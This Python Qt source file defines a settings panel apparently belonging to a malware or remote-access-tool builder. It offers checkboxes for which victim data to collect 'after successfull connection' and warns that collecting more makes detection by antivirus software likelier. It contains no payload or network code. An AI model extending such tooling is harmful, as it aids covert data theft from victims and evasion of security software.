from qtpy.QtCore import (Qt, Slot, QVariant)
from qtpy.QtGui import QStandardItemModel, QStandardItem
from qtpy.QtWidgets import (QVBoxLayout, QLabel, QListView)

from core.config import ConfigManager

from .ConfigBaseFrame import ConfigBaseFrame


class InfoFrame(ConfigBaseFrame):

    def __init__(self, parent):
        super(InfoFrame, self).__init__(parent)

        self.widget_layout = QVBoxLayout(self)
        self.setLayout(self.widget_layout)

        self.section_label = QLabel(self)
        self.section_label.setText("Informations")
        self.widget_layout.addWidget(self.section_label)

        self.label = QLabel(self)
        self.label.setText("Select information to collect after successfull connection. Keep in mind that the more "
                           "data you collect the more suspicious you are for antivirus software. You can "
                           "change these settings later.")
        self.label.setWordWrap(True)
        self.widget_layout.addWidget(self.label)

        self.list = QListView(self)
        self.model = QStandardItemModel(self.list)
        self.widget_layout.addWidget(self.list)
        self.list.setModel(self.model)

        self.item_string = {}
        infos = ConfigManager.get_infos()

        for info in infos:
            self.item_string[info] = {"name": " ".join(info.capitalize().split("_"))}

        for string in self.item_string:
            item = QStandardItem(self.item_string.get(string).get("name"))
            item.setFlags(Qt.ItemIsEnabled)
            item.setData(QVariant(Qt.Checked), Qt.CheckStateRole)
            self.model.appendRow(item)

    @Slot()
    def collect_info(self):
        infos = []
        for info in self.item_string:
            item = self.model.findItems(self.item_string.get(info).get("name"))[0]
            if item.checkState() == Qt.Checked:
                infos.append(info)

        return {"after_connection_infos":  infos}
